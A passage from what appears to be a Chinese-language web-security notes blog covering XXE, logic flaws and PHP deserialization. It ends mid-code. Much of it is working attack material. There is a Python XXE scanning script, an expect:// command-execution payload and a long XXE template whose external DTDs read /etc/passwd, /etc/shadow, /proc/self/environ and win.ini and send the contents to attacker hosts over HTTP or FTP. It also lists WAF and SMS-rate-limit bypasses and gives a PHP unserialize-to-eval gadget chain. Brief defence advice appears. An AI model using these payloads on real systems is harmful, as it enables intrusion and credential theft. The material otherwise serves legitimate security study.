send_xml(xml):</span><br><span class="line">	headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;application&#x2F;xml&#39;&#125;</span><br><span class="line">	x &#x3D; requests.post(&#39;http:&#x2F;&#x2F;10.1.1.1&#x2F;xml&#x2F;xxe.php&#39;, data&#x3D;xml, headers&#x3D;headers, timeout&#x3D;3).text</span><br><span class="line">	coded_string &#x3D; x.spit(&#39; &#39;)[-2]</span><br><span class="line">	print(coded_string)</span><br><span class="line">for i in range(1,255):</span><br><span class="line">	try:</span><br><span class="line">		i &#x3D; str(i)</span><br><span class="line">		ip &#x3D; &#39;10.1.1.&#39; + i</span><br><span class="line">		string &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;&#39; + ip + &#39;&#x2F;&#39;</span><br><span class="line">		print(string)</span><br><span class="line">		bulid_xml(string)</span><br><span class="line">	except:</span><br><span class="line">		continue</span><br></pre></td></tr></table></figure>
+
+&gt; REC(命令执行)
+    条件： 目标系统为Linux系统，目标系统成功安装PHP的expect扩展，可执行的命令与当前用户的权限大小有关，命令中不能有空格，否则会报错
+    &lt;?xml version=&quot;1.0&quot;?&gt;
+    &lt;!DOCTYPE root [ 
+    &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;
+    ]&gt;
+    &lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre><h3 id="xxe的绕过方法"><a href="#xxe的绕过方法" class="headerlink" title="xxe的绕过方法"></a>xxe的绕过方法</h3><pre><code>1. 大小写绕过
+2. html实体编码绕过
+3. data://协议绕过
+    &lt;?xml version=&quot;1.0&quot; ?&gt;
+    &lt;!DOCTYPE test [
+        &lt;!ENTITY % a SYSTEM &quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+&quot;&gt;
+        %a;
+        %b;
+    ]&gt;
+    &lt;test&gt;&amp;hhh;&lt;/test&gt;
+    &lt;!--编码内容--&gt;
+    &lt;!ENTITY % b SYSTEM &apos;http://10.1.1.1:8888/test.dtd&apos;&gt;</code></pre><h3 id="xxe漏洞防御"><a href="#xxe漏洞防御" class="headerlink" title="xxe漏洞防御"></a>xxe漏洞防御</h3><pre><code>1. 过滤用户输入的xml数据，如尖括号，或者一些关键字&lt;!DOCTYPE&gt; &lt;!ENTITY&gt; SYSTEM等
+2. 禁用外部实体
+    PHP：
+    libxml_disable_entity_loader(true);
+    JAVA:
+    DocumentBuilderFactorydbf =DocumentBuilderFactory.newInstance();
+    dbf.setExpandEntityReferences(false);
+    Python：
+    from lxml import etree
+    xmlData= etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><h3 id="xxe-payload模版"><a href="#xxe-payload模版" class="headerlink" title="xxe payload模版"></a>xxe payload模版</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;sp;&lt;&#x2F;r&gt;</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;ev.xml&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param1;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;exfil;&lt;&#x2F;r&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;?%data;&#39;&gt;&quot;&gt;</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;ev.xml&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param1;</span><br><span class="line">%exfil;</span><br><span class="line">]&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;?%data;&#39;&gt;&quot;&gt;</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ENTITY % data3 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow&quot;&gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;EvilHost:port&#x2F;sp.dtd&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param3;</span><br><span class="line">%exfil;</span><br><span class="line">]&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;ftp:&#x2F;&#x2F;Evilhost:port&#x2F;%data3;&#39;&gt;&quot;&gt;</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ENTITY % data3 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;ss5.dtd&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param3;</span><br><span class="line">%exfil;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&lt;&#x2F;r&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % param1 &#39;&lt;!ENTITY &amp;#x25; external SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;nothere&#x2F;%payload;&quot;&gt;&#39;&gt; %param1; %external;</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"> &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line"> &lt;!ENTITY % stuff SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;customapp&#x2F;WEB-INF&#x2F;applicationContext.xml &quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;evil&#x2F;evil.xml&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;all;&lt;&#x2F;root&gt;</span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"> </span><br><span class="line">&lt;!ENTITY all &quot;%start;%stuff;%end;&quot;&gt;</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ </span><br><span class="line">  &lt;!ENTITY % one SYSTEM &quot;http:&#x2F;&#x2F;attacker.tld&#x2F;dtd-part&quot; &gt;</span><br><span class="line">  %one;</span><br><span class="line">  %two;</span><br><span class="line">  %four;</span><br><span class="line">]&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % three SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % two &quot;&lt;!ENTITY % four SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;%three;&#39;&gt;&quot;&gt;</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % asd SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:4444&#x2F;ext.dtd&quot;&gt;</span><br><span class="line">%asd;</span><br><span class="line">%c;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;rrr;&lt;&#x2F;a&gt;</span><br><span class="line">## External dtd ##</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;environ&quot;&gt;</span><br><span class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY rrr SYSTEM &#39;ftp:&#x2F;&#x2F;x.x.x.x:2121&#x2F;%d;&#39;&gt;&quot;&gt;</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:22&#x2F;&quot;&gt; %dtd;]&gt;&lt;xxx&#x2F;&gt;]]&gt;&lt;&#x2F;foo&gt;&lt;&#x2F;soap:Body&gt;</span><br><span class="line">---------------------------</span><br><span class="line"> WAF Bypass</span><br><span class="line">---------------------------</span><br><span class="line">&lt;!DOCTYPE :. SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE :_-_: SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM &quot;http:&#x2F;&#x2F;&quot;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="逻辑漏洞的定义"><a href="#逻辑漏洞的定义" class="headerlink" title="逻辑漏洞的定义"></a>逻辑漏洞的定义</h3><pre><code>逻辑漏洞，是因为程序员在编写程序的时候，跟随着人的思维逻辑产生的不足，与传统漏洞的不同在于，逻辑漏洞是用过合法的方式来达到破坏的，比如密码找回，用户登录验证等功能由于程序设计的不足，会产生很多问题，这一类漏洞一般的防护手段或者设备无法阻止，漏洞扫描器也难以发现。</code></pre><h3 id="逻辑漏洞产生的原因"><a href="#逻辑漏洞产生的原因" class="headerlink" title="逻辑漏洞产生的原因"></a>逻辑漏洞产生的原因</h3><pre><code>程序逻辑不严或者逻辑太复杂，导致一些逻辑分支不能够正常处理或者处理错误，一般出现在任意密码修改，越权访问，密码找回，交易支付金额，身份认证，实名认证等。</code></pre><h3 id="常见的逻辑漏洞分类"><a href="#常见的逻辑漏洞分类" class="headerlink" title="常见的逻辑漏洞分类"></a>常见的逻辑漏洞分类</h3><pre><code>1. url跳转漏洞
+2. 短信轰炸漏洞
+3. 任意密码修改漏洞
+4. 任意用户登录漏洞
+5. 越权漏洞
+6. 支付逻辑漏洞
+7. 条件竞争漏洞</code></pre><h3 id="url跳转漏洞"><a href="#url跳转漏洞" class="headerlink" title="url跳转漏洞"></a>url跳转漏洞</h3><pre><code>&gt; 定义
+    url跳转漏洞也叫开放重定向漏洞，可以把用户重定向到攻击者自己构造的页面去，简单来说就是跳到任意指定的url
+
+&gt; 产生原因
+    服务端未对传入的跳转url进行检查和控制，可能导致可以恶意构造任意一个恶意地址，诱导用户跳转到恶意网站
+
+&gt; url跳转发生的地方
+    1. 用户登录、统一身份认证处，认证完后会跳转
+    2. 用户分享、收藏内容过后，会跳转
+    3. 跨站点认证、授权后，会跳转
+    4. 站内点击其它网址链接时，会跳转
+
+&gt; 存在url跳转的参数名
+    redirect，redirect_to，redirect_url，url，jump，jump_to，target，to，link，linkto，domain
+
+&gt; url跳转bypass
+    1. 利用问号绕过：url=https://www.baidu.com?www.xxxx.com
+    2. 利用@绕过：url=https://www.baidu.com@www.xxxx.com
+    3. 利用斜杆反斜杠绕过
+    4. 利用#绕过
+    6. 利用子域名绕过
+    7. 利用跳转ip绕过
+    8. 利用畸形url绕过
+    参考资料：https://www.anquanke.com/post/id/94377</code></pre><h3 id="短信轰炸漏洞"><a href="#短信轰炸漏洞" class="headerlink" title="短信轰炸漏洞"></a>短信轰炸漏洞</h3><pre><code>&gt; 漏洞产生的原因
+    厂商在对信息发送的次数，时间没有做出限制，或者只在前段做了限制，导致可以无限制的发送消息
+
+&gt; 漏洞产生的位置
+    登录，注册，找回密码，绑定邮箱，修改账号...一切需要验证的地方
+
+&gt;  bypass
+    1. 在moblie后面加%20
+    2. 在mobile后面加字幕
+    3. 在mobile后面进行多次参数叠加重复
+    4. 利用调用接口绕过轰炸限制
+    5. 修改cookie绕过轰炸限制
+    6. 修改IP绕过轰炸限制
+    7. 利用大小写绕过轰炸限制
+    8. 修改返回值绕过轰炸限制</code></pre><h3 id="任意密码重置漏洞"><a href="#任意密码重置漏洞" class="headerlink" title="任意密码重置漏洞"></a>任意密码重置漏洞</h3><pre><code>&gt; 成因
+    厂商在对密码修改的时候，未对修改密码的凭证做严格的限制，导致可以被绕过进行任意密码修改
+
+&gt; 场景
+    1. 验证码可爆破
+    2. 验证码可回传
+    3. 验证码未绑定用户
+    4. 用户混淆
+    5. 本地验证绕过
+    6. 跳过验证步骤
+    7. token可预测
+    8. 同时向多个账户发送凭证
+    9. 接收端可篡改
+    10. 万能验证码</code></pre><h3 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h3><pre><code>&gt; 原理
+    逻辑错误导致可以任意用户登录。撞库获得用户名手机或者邮箱，通过验证码登录，若抓包修改接收验证码的手机号或者邮箱，然后使用该验证码能使撞库的用户登录，即可产生漏洞。
+
+&gt; 场景
+    1. 手机登录验证码回显
+    2. 修改返回包可以登录
+    3. 通过遍历id可以登录
+    4. sql注入万能密码
+    5. 系统默认弱口令
+    6. 撞库
+    7. cookie混淆</code></pre><h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><pre><code>&gt; 原理
+    越权访问漏洞又可以分为横向越权访问漏洞和纵向越权访问漏洞。一般只一个用A可以操作另一个用户B才能做的事情
+
+&gt; 原因
+    越权漏洞的成因主要是因为开发人员在对数据的增删改查时对客户端请求的数据过分信任而遗漏了权限的判定
+
+&gt; 平行越权
+    水平越权就是相同级别（权限）的用户或者同一角色的不同用户之间，可以越权访问、修改或者删除的非法操作。如果出现此类漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。比如同一公司的员工A和B，分别只能查看自己的一些个人资料，但是如果系统存在水平越权漏洞，则A可以通过这样个漏洞查看到B的资料。水平权限漏洞一般出现在一个用户对象关联多个其他对象(个人资料、修改密码，订单信息，等)、并且要实现对关联对象的CRUD的时候。开发容易习惯性的在生成CRUD表单(或AJAX请求)的时候根据认证过的用户身份来找出其有权限的被操作对象ID,提供入口，然后让用户提交请求，并根据这个id来操作相关对象。在处理CRUD请求时，往往默认只有有权限的用户才能得到入口，进而才能操作相关对象，因此就不再校验权限了。可悲剧的是大多数对象的ID都被设置为自增整型，所以攻击者只要对相关id加1、减1、直至遍历，就可以操作其他用户所关联的对象了。
+
+
+&gt; 垂直越权
+    查垂直越权又被分为向上越权与向下越权。比如，某些网站，像发布文章、删除文章等操作是属于管理员做的事情，假设一个低权限用户或者根本没权限也可以做相同的事情，这就叫作向上越权,
+      向下越权与向上越权恰恰相反，向下越权是一个高级别用户可以访问一个低级别的用户信息。这样做似乎没错，而且很多网站都是这么做的，包括低级别密码也可以被高级别用户掌控，但这样做可以说是完全错误！因为即使权限再低的用户都有他自己的隐私，可能用户为了更方便，会将自己的银行卡号与密码记录在网站中，这些信息都属于用户的隐私。</code></pre><h3 id="支付逻辑漏洞"><a href="#支付逻辑漏洞" class="headerlink" title="支付逻辑漏洞"></a>支付逻辑漏洞</h3><pre><code>&gt; 原因
+    开发人员往往为了方便，直接在支付的关键步骤数据包中直接传递需要支付的金额。而这种金额后端没有做校验，传递过程中也没有做签名，导致可以随意篡改提交金额。
+
+&gt; 场景
+    1. 修改购买数量
+    2. 修改支付价格
+    3. 修改支付对应的商品
+    4. 修改支付的状态
+    5. 修改附属优惠，领取优惠
+    6. 测试数据包未删除</code></pre><p><img src="https://ftp.bmp.ovh/imgs/2019/12/8cd9cfe57ca66072.png" alt=""></p>
+<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><pre><code>序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等 函数 : serialize()
+反序列化:恢复原先被序列化的变量 函数: unserialize()
+反序列化的意义：在传递变量的过程中，有可能遇到变量值要跨脚本传递，如果一个脚本中想要调用之前一个脚本的变量，但是之前一个脚本已经执行完毕，所有的变量和内容释放掉了，这种情况下可以用反序列化将变量和内容恢复回来。反序列化的目的是为了方便数据的传输和存储。</code></pre><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h3><pre><code>PHP通过serialize()和unserialize()两个函数实现序列化和反序列化。产生反序列化漏洞的原因是在PHP代码中使用unserialize函数反序列化某一个对象，该对象自动执行自定义的魔法方法，如果这些魔法方法中有危险的操作，或者在魔法方法中去调用类中其他带有危险操作的函数，如果危险操作可控，那么就可能会触发PHP反序列化漏洞。
+
+&gt; 序列化
+    先来看个序列化例子：
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    private $test1&#x3D;&quot;hello&quot;;</span><br><span class="line">    public $test2&#x3D;&quot;hello&quot;;</span><br><span class="line">    protected $test3&#x3D;&quot;hello&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test &#x3D; new test();</span><br><span class="line">echo serialize($test); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+    结果：O:4:&quot;test&quot;:3:{s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;}
+    test类定义了三个不同类型(私有，公有，保护)但是值相同的字符串，序列化输出的值不相同 O:4:&quot;test&quot;:3:{s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;}
+     O：Object，4：对象所属类名长度，test：对象所属类名，3：类中的三个属性，s:string，11:属性名长度，test test1:属性值，后面同理
+    通过对网页抓取输出是这样的 O:4:&quot;test&quot;:3:{s:11:&quot;\00test\00test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot;\00*\00test3&quot;;s:5:&quot;hello&quot;;}
+    private属性序列化的时候格式是 %00类名%00成员名：private的参数被反序列化后变成 \00test\00test1 
+    protected属性序列化的时候格式是 %00*%00成员名：public的参数变成 test2 protected的参数变成 \00*\00test3
+    序列化只序列化属性，不序列化方法：
+        1. 我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在
+        这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。
+        2. 我们在反序列化攻击的时候也就是依托类属性进行攻击
+        因为没有序列化方法嘛，我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击
+
+&gt; 反序列化
+    先来了解几个魔法方法，php中带__(双下划线)的类方法成为魔法方法：
+        1. __construct()：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)
+        2. __wakeup() ：unserialize()时会自动调用
+        3. __sleep()，执行serialize()时，先会调用这个函数
+        4. __destruct()：当对象被销毁时会自动调用
+        5. __toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用
+    看一下这几个魔法方法先后执行的顺序：
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class pompom&#123;</span><br><span class="line">	  private $name &#x3D; &quot;pompom&quot;;</span><br><span class="line">	  function __construct()&#123;</span><br><span class="line">	     echo &quot;__construct&quot;;</span><br><span class="line">	     echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	  &#125;</span><br><span class="line">	  function __sleep()&#123;</span><br><span class="line">	     echo &quot;__sleep&quot;;</span><br><span class="line">	     echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	     return array(&quot;name&quot;);</span><br><span class="line">	  &#125;</span><br><span class="line">	  function __wakeup()&#123;</span><br><span class="line">	     echo &quot;__wakeup&quot;;</span><br><span class="line">	     echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	  &#125;</span><br><span class="line">	  function __destruct()&#123;</span><br><span class="line">	     echo &quot;__destruct&quot;;</span><br><span class="line">	     echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	  &#125;</span><br><span class="line">	  function __toString()&#123;</span><br><span class="line">	     return &quot;__toString&quot;.&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$pompom_old &#x3D; new pompom();</span><br><span class="line">	$data &#x3D; serialize($pompom_old);</span><br><span class="line">	$pompom_new &#x3D; unserialize($data);</span><br><span class="line">	print($pompom_new);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+    结果：
+        __construct
+        __sleep
+        __wakeup
+        __toString
+        __destruct
+        __destruct
+    从上至下解释一遍就是首先实例化创建对象的时候调用了__construct方法，在serialize进行序列化的时候调用了__sleep方法，在unserialize反序列化的时候调用了__wakeup发法，在输出对象的时候调用了__tostring方法，最后销毁对象的时候调用了__destruct方法，调用了两次是因为有两个对象，一个是实例化创建的对象，另一个是反序列化后的对象。
+    在看一下反序列化漏洞是如何产生的：
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class K0rz3n &#123;</span><br><span class="line">	    private $test;</span><br><span class="line">	    public $K0rz3n &#x3D; &quot;i am K0rz3n&quot;;</span><br><span class="line">	    function __construct() &#123;</span><br><span class="line">	        $this-&gt;test &#x3D; new L();</span><br><span class="line">	    &#125;</span><br><span class="line">	    function __destruct() &#123;</span><br><span class="line">	        $this-&gt;test-&gt;action();</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	class L &#123;</span><br><span class="line">	    function action() &#123;</span><br><span class="line">	        echo &quot;Welcome to XDSEC&quot;;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	class Evil &#123;</span><br><span class="line">	    var $test2;</span><br><span class="line">	    function action() &#123;</span><br><span class="line">	        eval($this-&gt;test2);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unserialize($_GET[&#39;test&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+    首先可以知道unserialize的参数是可控的，后面两个类没什么用，因为没有任何可以利用的方法，但是第一个类有__destruct方法且可以调用action，而Evil类里面的action可以执行eval，同时这个方法是在实例化对象被销毁的时候会自动创建，不需要人工干预，那么我们需要将K0rz3n这个类中的test属性篡改为Evil这个类的对象，然后为了eval能执行命令，我们还要篡改Evil对象的test2属性，执行payload：
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class K0rz3n &#123;</span><br><span class="line">	    private $test;</span><br><span class="line">	    function __construct() &#123;</span><br><span class="line">	        $this-&gt;test &#x3D; new Evil;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	class Evil &#123;</span><br><span class="line">	    var $test2 &#x3D; &quot;phpinfo();&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	$K0rz3n &#x3D; new K0rz3n;</span><br><span class="line">	$data &#x3D; serialize($K0rz3n);</span><br><span class="line">	echo %data</span><br><span 